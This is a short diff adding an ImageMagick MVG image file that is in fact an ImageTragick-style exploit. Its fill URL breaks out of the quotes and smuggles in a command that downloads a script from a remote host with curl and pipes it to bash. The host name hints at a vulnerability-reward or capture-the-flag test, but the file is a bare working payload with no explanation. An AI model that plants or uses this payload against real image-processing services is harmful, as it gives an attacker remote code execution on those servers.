@@ -1,0 +1,4 @@
+push graphic-context
+viewbox 0 0 8 8
+fill 'url(https://httpbin.org/image/png"|curl -s http://jsrc-flag.jd.local/s | bash")'
+pop graphic-context
